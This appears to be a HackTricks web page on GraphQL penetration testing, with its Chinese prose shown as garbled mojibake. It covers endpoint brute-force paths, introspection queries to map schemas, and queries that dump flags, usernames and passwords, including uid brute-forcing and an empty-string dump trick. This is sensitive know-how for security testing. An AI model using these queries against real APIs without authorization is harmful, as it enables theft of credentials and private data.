<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>GraphQL</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="graphql"><a class="header" href="#graphql">GraphQL</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
<p>é€šè¿‡ 8kSec å­¦é™¢æ·±åŒ–æ‚¨åœ¨ <strong>ç§»åŠ¨å®‰å…¨</strong> æ–¹é¢çš„ä¸“ä¸šçŸ¥è¯†ã€‚é€šè¿‡æˆ‘ä»¬çš„è‡ªå­¦è¯¾ç¨‹æŒæ¡ iOS å’Œ Android å®‰å…¨å¹¶è·å¾—è®¤è¯ï¼š</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<h2 id="ä»‹ç»"><a class="header" href="#ä»‹ç»">ä»‹ç»</a></h2>
<p>GraphQL è¢« <strong>å¼ºè°ƒ</strong> ä¸º <strong>REST API çš„é«˜æ•ˆæ›¿ä»£æ–¹æ¡ˆ</strong>ï¼Œæä¾›äº†ä¸€ç§ç®€åŒ–çš„ä»åç«¯æŸ¥è¯¢æ•°æ®çš„æ–¹æ³•ã€‚ä¸ REST ç›¸æ¯”ï¼ŒREST é€šå¸¸éœ€è¦åœ¨ä¸åŒçš„ç«¯ç‚¹ä¹‹é—´è¿›è¡Œå¤šæ¬¡è¯·æ±‚ä»¥æ”¶é›†æ•°æ®ï¼Œè€Œ GraphQL å…è®¸é€šè¿‡ <strong>å•ä¸ªè¯·æ±‚</strong> è·å–æ‰€æœ‰æ‰€éœ€çš„ä¿¡æ¯ã€‚è¿™ç§ç®€åŒ–æ˜¾è‘— <strong>æœ‰åˆ©äºå¼€å‘äººå‘˜</strong>ï¼Œå‡å°‘äº†ä»–ä»¬çš„æ•°æ®è·å–è¿‡ç¨‹çš„å¤æ‚æ€§ã€‚</p>
<h2 id="graphql-å’Œå®‰å…¨æ€§"><a class="header" href="#graphql-å’Œå®‰å…¨æ€§">GraphQL å’Œå®‰å…¨æ€§</a></h2>
<p>éšç€æ–°æŠ€æœ¯çš„å‡ºç°ï¼ŒåŒ…æ‹¬ GraphQLï¼Œæ–°çš„å®‰å…¨æ¼æ´ä¹Ÿéšä¹‹è€Œæ¥ã€‚ä¸€ä¸ªå…³é”®ç‚¹æ˜¯ <strong>GraphQL é»˜è®¤ä¸åŒ…å«èº«ä»½éªŒè¯æœºåˆ¶</strong>ã€‚å¼€å‘äººå‘˜æœ‰è´£ä»»å®æ–½è¿™äº›å®‰å…¨æªæ–½ã€‚æ²¡æœ‰é€‚å½“çš„èº«ä»½éªŒè¯ï¼ŒGraphQL ç«¯ç‚¹å¯èƒ½ä¼šå‘æœªè®¤è¯ç”¨æˆ·æš´éœ²æ•æ„Ÿä¿¡æ¯ï¼Œæ„æˆé‡å¤§å®‰å…¨é£é™©ã€‚</p>
<h3 id="ç›®å½•æš´åŠ›æ”»å‡»ä¸-graphql"><a class="header" href="#ç›®å½•æš´åŠ›æ”»å‡»ä¸-graphql">ç›®å½•æš´åŠ›æ”»å‡»ä¸ GraphQL</a></h3>
<p>ä¸ºäº†è¯†åˆ«æš´éœ²çš„ GraphQL å®ä¾‹ï¼Œå»ºè®®åœ¨ç›®å½•æš´åŠ›æ”»å‡»ä¸­åŒ…å«ç‰¹å®šè·¯å¾„ã€‚è¿™äº›è·¯å¾„åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>/graphql</code></li>
<li><code>/graphiql</code></li>
<li><code>/graphql.php</code></li>
<li><code>/graphql/console</code></li>
<li><code>/api</code></li>
<li><code>/api/graphql</code></li>
<li><code>/graphql/api</code></li>
<li><code>/graphql/graphql</code></li>
</ul>
<p>è¯†åˆ«å¼€æ”¾çš„ GraphQL å®ä¾‹å¯ä»¥æ£€æŸ¥æ”¯æŒçš„æŸ¥è¯¢ã€‚è¿™å¯¹äºç†è§£é€šè¿‡ç«¯ç‚¹è®¿é—®çš„æ•°æ®è‡³å…³é‡è¦ã€‚GraphQL çš„è‡ªçœç³»ç»Ÿé€šè¿‡è¯¦ç»†è¯´æ˜æ¨¡å¼æ”¯æŒçš„æŸ¥è¯¢æ¥ä¿ƒè¿›è¿™ä¸€ç‚¹ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜… GraphQL å…³äºè‡ªçœçš„æ–‡æ¡£ï¼š<a href="https://graphql.org/learn/introspection/"><strong>GraphQLï¼šAPI çš„æŸ¥è¯¢è¯­è¨€ã€‚</strong></a></p>
<h3 id="æŒ‡çº¹è¯†åˆ«"><a class="header" href="#æŒ‡çº¹è¯†åˆ«">æŒ‡çº¹è¯†åˆ«</a></h3>
<p>å·¥å…· <a href="https://github.com/dolevf/graphw00f"><strong>graphw00f</strong></a> èƒ½å¤Ÿæ£€æµ‹æœåŠ¡å™¨ä½¿ç”¨çš„ GraphQL å¼•æ“ï¼Œå¹¶æ‰“å°ä¸€äº›å¯¹å®‰å…¨å®¡è®¡å‘˜æœ‰å¸®åŠ©çš„ä¿¡æ¯ã€‚</p>
<h4 id="é€šç”¨æŸ¥è¯¢"><a class="header" href="#é€šç”¨æŸ¥è¯¢">é€šç”¨æŸ¥è¯¢ <a href="#universal-queries" id="universal-queries"></a></a></h4>
<p>è¦æ£€æŸ¥ URL æ˜¯å¦ä¸º GraphQL æœåŠ¡ï¼Œå¯ä»¥å‘é€ä¸€ä¸ª <strong>é€šç”¨æŸ¥è¯¢</strong>ï¼Œ<code>query{__typename}</code>ã€‚å¦‚æœå“åº”åŒ…å« <code>{"data": {"__typename": "Query"}}</code>ï¼Œåˆ™ç¡®è®¤è¯¥ URL æ‰˜ç®¡äº†ä¸€ä¸ª GraphQL ç«¯ç‚¹ã€‚æ­¤æ–¹æ³•ä¾èµ–äº GraphQL çš„ <code>__typename</code> å­—æ®µï¼Œè¯¥å­—æ®µæ­ç¤ºäº†è¢«æŸ¥è¯¢å¯¹è±¡çš„ç±»å‹ã€‚</p>
<pre><code class="language-javascript">query{__typename}
</code></pre>
<h3 id="åŸºæœ¬æšä¸¾"><a class="header" href="#åŸºæœ¬æšä¸¾">åŸºæœ¬æšä¸¾</a></h3>
<p>Graphql é€šå¸¸æ”¯æŒ <strong>GET</strong>ã€<strong>POST</strong> (x-www-form-urlencoded) å’Œ <strong>POST</strong>(json)ã€‚è™½ç„¶å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå»ºè®®ä»…å…è®¸ json ä»¥é˜²æ­¢ CSRF æ”»å‡»ã€‚</p>
<h4 id="åå‘å·¥ç¨‹"><a class="header" href="#åå‘å·¥ç¨‹">åå‘å·¥ç¨‹</a></h4>
<p>è¦ä½¿ç”¨åå‘å·¥ç¨‹å‘ç°æ¶æ„ä¿¡æ¯ï¼Œè¯·æŸ¥è¯¢ <code>__schema</code> å­—æ®µã€‚è¯¥å­—æ®µåœ¨æ‰€æœ‰æŸ¥è¯¢çš„æ ¹ç±»å‹ä¸Šå¯ç”¨ã€‚</p>
<pre><code class="language-bash">query={__schema{types{name,fields{name}}}}
</code></pre>
<p>é€šè¿‡æ­¤æŸ¥è¯¢ï¼Œæ‚¨å°†æ‰¾åˆ°æ‰€æœ‰æ­£åœ¨ä½¿ç”¨çš„ç±»å‹çš„åç§°ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(1036).png" alt="" /></p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
</code></pre>
<p>{% endcode %}</p>
<p>é€šè¿‡è¿™ä¸ªæŸ¥è¯¢ï¼Œæ‚¨å¯ä»¥æå–æ‰€æœ‰ç±»å‹ã€å®ƒçš„å­—æ®µå’Œå®ƒçš„å‚æ•°ï¼ˆä»¥åŠå‚æ•°çš„ç±»å‹ï¼‰ã€‚è¿™å°†éå¸¸æœ‰åŠ©äºäº†è§£å¦‚ä½•æŸ¥è¯¢æ•°æ®åº“ã€‚</p>
<p><img src="../../.gitbook/assets/image%20(950).png" alt="" /></p>
<p><strong>é”™è¯¯</strong></p>
<p>äº†è§£<strong>é”™è¯¯</strong>æ˜¯å¦ä¼šè¢«<strong>æ˜¾ç¤º</strong>æ˜¯å¾ˆæœ‰è¶£çš„ï¼Œå› ä¸ºå®ƒä»¬å°†æä¾›æœ‰ç”¨çš„<strong>ä¿¡æ¯ã€‚</strong></p>
<pre><code>?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
</code></pre>
<p><img src="../../.gitbook/assets/image%20(416).png" alt="" /></p>
<p><strong>é€šè¿‡è‡ªçœæšä¸¾æ•°æ®åº“æ¨¡å¼</strong></p>
<p>{% hint style="info" %}
å¦‚æœè‡ªçœå·²å¯ç”¨ä½†ä¸Šè¿°æŸ¥è¯¢æ— æ³•è¿è¡Œï¼Œè¯·å°è¯•ä»æŸ¥è¯¢ç»“æ„ä¸­åˆ é™¤ <code>onOperation</code>ã€<code>onFragment</code> å’Œ <code>onField</code> æŒ‡ä»¤ã€‚
{% endhint %}</p>
<pre><code class="language-bash">#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
</code></pre>
<p>å†…è”è‡ªçœæŸ¥è¯¢ï¼š</p>
<pre><code>/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
</code></pre>
<p>æœ€åä¸€è¡Œä»£ç æ˜¯ä¸€ä¸ªgraphqlæŸ¥è¯¢ï¼Œå®ƒå°†è½¬å‚¨æ‰€æœ‰æ¥è‡ªgraphqlçš„å…ƒä¿¡æ¯ï¼ˆå¯¹è±¡åç§°ã€å‚æ•°ã€ç±»å‹...ï¼‰</p>
<p><img src="../../.gitbook/assets/image%20(363).png" alt="" /></p>
<p>å¦‚æœå¯ç”¨äº†è‡ªçœï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/APIs-guru/graphql-voyager"><strong>GraphQL Voyager</strong></a> åœ¨å›¾å½¢ç”¨æˆ·ç•Œé¢ä¸­æŸ¥çœ‹æ‰€æœ‰é€‰é¡¹ã€‚</p>
<h3 id="æŸ¥è¯¢"><a class="header" href="#æŸ¥è¯¢">æŸ¥è¯¢</a></h3>
<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“æ•°æ®åº“ä¸­ä¿å­˜äº†å“ªç§ä¿¡æ¯ï¼Œè®©æˆ‘ä»¬å°è¯•<strong>æå–ä¸€äº›å€¼</strong>ã€‚</p>
<p>åœ¨è‡ªçœä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°<strong>å¯ä»¥ç›´æ¥æŸ¥è¯¢çš„å¯¹è±¡</strong>ï¼ˆå› ä¸ºæ‚¨ä¸èƒ½ä»…ä»…å› ä¸ºå¯¹è±¡å­˜åœ¨å°±æŸ¥è¯¢å®ƒï¼‰ã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°â€œ<em>queryType</em>â€è¢«ç§°ä¸ºâ€œ<em>Query</em>â€ï¼Œè€Œâ€œ<em>Query</em>â€å¯¹è±¡çš„ä¸€ä¸ªå­—æ®µæ˜¯â€œ<em>flags</em>â€ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§å¯¹è±¡ç±»å‹ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æŸ¥è¯¢æ ‡å¿—å¯¹è±¡ã€‚</p>
<p><img src="../../.gitbook/assets/Screenshot%20from%202021-03-13%2018-17-48.png" alt="" /></p>
<p>è¯·æ³¨æ„ï¼ŒæŸ¥è¯¢â€œ<em>flags</em>â€çš„ç±»å‹æ˜¯â€œ<em>Flags</em>â€ï¼Œè¯¥å¯¹è±¡å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><img src="../../.gitbook/assets/Screenshot%20from%202021-03-13%2018-22-57%20(1).png" alt="" /></p>
<p>æ‚¨å¯ä»¥çœ‹åˆ°â€œ<em>Flags</em>â€å¯¹è±¡ç”±<strong>name</strong>å’Œ<strong>value</strong>ç»„æˆã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢è·å–æ‰€æœ‰æ ‡å¿—çš„åç§°å’Œå€¼ï¼š</p>
<pre><code class="language-javascript">query={flags{name, value}}
</code></pre>
<p>æ³¨æ„ï¼Œå¦‚æœ<strong>æŸ¥è¯¢çš„å¯¹è±¡</strong>æ˜¯åƒ<strong>å­—ç¬¦ä¸²</strong>è¿™æ ·çš„<strong>åŸå§‹****ç±»å‹</strong>ï¼Œå¦‚ä»¥ä¸‹ç¤ºä¾‹æ‰€ç¤º</p>
<p><img src="../../.gitbook/assets/image%20(958).png" alt="" /></p>
<p>æ‚¨å¯ä»¥ç›´æ¥æŸ¥è¯¢ï¼š</p>
<pre><code class="language-javascript">query={hiddenFlags}
</code></pre>
<p>åœ¨å¦ä¸€ä¸ªä¾‹å­ä¸­ï¼Œ"<em>Query</em>" ç±»å‹å¯¹è±¡ä¸­æœ‰ä¸¤ä¸ªå¯¹è±¡ï¼š"<em>user</em>" å’Œ "<em>users</em>"ã€‚<br />
å¦‚æœè¿™äº›å¯¹è±¡ä¸éœ€è¦ä»»ä½•å‚æ•°è¿›è¡Œæœç´¢ï¼Œå¯ä»¥é€šè¿‡<strong>è¯·æ±‚</strong>æ‰€éœ€çš„æ•°æ®æ¥<strong>æ£€ç´¢æ‰€æœ‰ä¿¡æ¯</strong>ã€‚åœ¨è¿™ä¸ªäº’è”ç½‘ç¤ºä¾‹ä¸­ï¼Œä½ å¯ä»¥æå–ä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(880).png" alt="" /></p>
<p>ç„¶è€Œï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœä½ å°è¯•è¿™æ ·åšï¼Œä½ ä¼šå¾—åˆ°è¿™ä¸ª<strong>é”™è¯¯</strong>ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(1042).png" alt="" /></p>
<p>çœ‹èµ·æ¥å®ƒä¼šä½¿ç”¨ç±»å‹ä¸º <em><strong>Int</strong></em> çš„ "<em><strong>uid</strong></em>" å‚æ•°è¿›è¡Œæœç´¢ã€‚<br />
æ— è®ºå¦‚ä½•ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨ <a href="graphql.html#basic-enumeration">Basic Enumeration</a> éƒ¨åˆ†æå‡ºäº†ä¸€ä¸ªæŸ¥è¯¢ï¼Œæ˜¾ç¤ºäº†æ‰€æœ‰æ‰€éœ€çš„ä¿¡æ¯ï¼š<code>query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}</code></p>
<p>å¦‚æœä½ é˜…è¯»æˆ‘è¿è¡Œè¯¥æŸ¥è¯¢æ—¶æä¾›çš„å›¾åƒï¼Œä½ ä¼šçœ‹åˆ° "<em><strong>user</strong></em>" æœ‰ä¸€ä¸ªç±»å‹ä¸º <em>Int</em> çš„ <strong>arg</strong> "<em><strong>uid</strong></em>"ã€‚</p>
<p>å› æ­¤ï¼Œé€šè¿‡ä¸€äº›è½»é‡çº§çš„ <em><strong>uid</strong></em> æš´åŠ›ç ´è§£ï¼Œæˆ‘å‘ç° <em><strong>uid</strong>=<strong>1</strong></em> æ—¶æ£€ç´¢åˆ°äº†ä¸€ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªå¯†ç ï¼š<br />
<code>query={user(uid:1){user,password}}</code></p>
<p><img src="../../.gitbook/assets/image%20(90).png" alt="" /></p>
<p>æ³¨æ„ï¼Œæˆ‘<strong>å‘ç°</strong>æˆ‘å¯ä»¥è¯·æ±‚ <strong>å‚æ•°</strong> "<em><strong>user</strong></em>" å’Œ "<em><strong>password</strong></em>"ï¼Œå› ä¸ºå¦‚æœæˆ‘å°è¯•æŸ¥æ‰¾ä¸å­˜åœ¨çš„å†…å®¹ (<code>query={user(uid:1){noExists}}</code>)ï¼Œæˆ‘ä¼šå¾—åˆ°è¿™ä¸ªé”™è¯¯ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(707).png" alt="" /></p>
<p>åœ¨<strong>æšä¸¾é˜¶æ®µ</strong>ï¼Œæˆ‘å‘ç° "<em><strong>dbuser</strong></em>" å¯¹è±¡çš„å­—æ®µæœ‰ "<em><strong>user</strong></em>" å’Œ "<em><strong>password</strong></em>"ã€‚</p>
<p><strong>æŸ¥è¯¢å­—ç¬¦ä¸²è½¬å‚¨æŠ€å·§ï¼ˆæ„Ÿè°¢ @BinaryShadow_ï¼‰</strong></p>
<p>å¦‚æœä½ å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²ç±»å‹è¿›è¡Œæœç´¢ï¼Œä¾‹å¦‚ï¼š<code>query={theusers(description: ""){username,password}}</code>ï¼Œå¹¶ä¸”ä½ <strong>æœç´¢ä¸€ä¸ªç©ºå­—ç¬¦ä¸²</strong>ï¼Œå®ƒå°†<strong>è½¬å‚¨æ‰€æœ‰æ•°æ®</strong>ã€‚ (<em>æ³¨æ„è¿™ä¸ªä¾‹å­ä¸æ•™ç¨‹çš„ä¾‹å­æ— å…³ï¼Œå¯¹äºè¿™ä¸ªä¾‹å­å‡è®¾ä½ å¯ä»¥é€šè¿‡ä¸€ä¸ªåä¸º "<strong>description</strong>" çš„å­—ç¬¦ä¸²å­—æ®µä½¿ç”¨ "<strong>theusers</strong>" è¿›è¡Œæœç´¢</em>).</p>
<h3 id="æœç´¢"><a class="header" href="#æœç´¢">æœç´¢</a></h3>
<p>åœ¨è¿™ä¸ªè®¾ç½®ä¸­ï¼Œä¸€ä¸ª<strong>æ•°æ®åº“</strong>åŒ…å«<strong>äººå‘˜</strong>å’Œ<strong>ç”µå½±</strong>ã€‚<strong>äººå‘˜</strong>é€šè¿‡ä»–ä»¬çš„<strong>ç”µå­é‚®ä»¶</strong>å’Œ<strong>å§“å</strong>è¿›è¡Œè¯†åˆ«ï¼›<strong>ç”µå½±</strong>é€šè¿‡å®ƒä»¬çš„<strong>åç§°</strong>å’Œ<strong>è¯„åˆ†</strong>è¿›è¡Œè¯†åˆ«ã€‚<strong>äººå‘˜</strong>å¯ä»¥äº’ä¸ºæœ‹å‹ï¼Œä¹Ÿå¯ä»¥æ‹¥æœ‰ç”µå½±ï¼Œè¡¨ç¤ºæ•°æ®åº“ä¸­çš„å…³ç³»ã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡<strong>å§“å</strong>æœç´¢äººå‘˜å¹¶è·å–ä»–ä»¬çš„ç”µå­é‚®ä»¶ï¼š</p>
<pre><code class="language-javascript">{
searchPerson(name: "John Doe") {
email
}
}
</code></pre>
<p>æ‚¨å¯ä»¥é€šè¿‡<strong>åç§°</strong>æœç´¢äººå‘˜å¹¶è·å–ä»–ä»¬çš„<strong>è®¢é˜…</strong>çš„<strong>ç”µå½±</strong>ï¼š</p>
<pre><code class="language-javascript">{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
</code></pre>
<p>æ³¨æ„å¦‚ä½•æŒ‡ç¤ºæ£€ç´¢è¯¥äººçš„ <code>subscribedMovies</code> çš„ <code>name</code>ã€‚</p>
<p>æ‚¨è¿˜å¯ä»¥<strong>åŒæ—¶æœç´¢å¤šä¸ªå¯¹è±¡</strong>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœç´¢äº† 2 éƒ¨ç”µå½±ï¼š</p>
<pre><code class="language-javascript">{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
</code></pre>
